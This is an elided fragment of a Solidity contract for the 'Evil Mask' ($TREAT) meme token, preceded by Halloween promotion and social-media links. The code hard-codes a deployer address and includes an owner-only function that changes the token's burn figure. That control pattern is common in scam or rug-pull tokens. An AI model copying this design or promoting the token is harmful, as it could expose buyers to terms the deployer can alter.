...
Free Trading On Halloween
Be Scary, Very Scary

Ready to get your $TREAT?

Telegram: https://t.me/EvilMaskETH
Twitter: https://twitter.com/EvilMaskETH
Website: https://evilmask.fun
...
pragma solidity ^0.8.20;
    ...
    contract EvilMask {
        string public constant name = "Evil Mask";  //
        ...
        address payable constant deployer = payable(address(0x852215cE2e85733EdFC1A5e7f989946a30C9CF0f)); //
        ...
        function _setTREAT(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
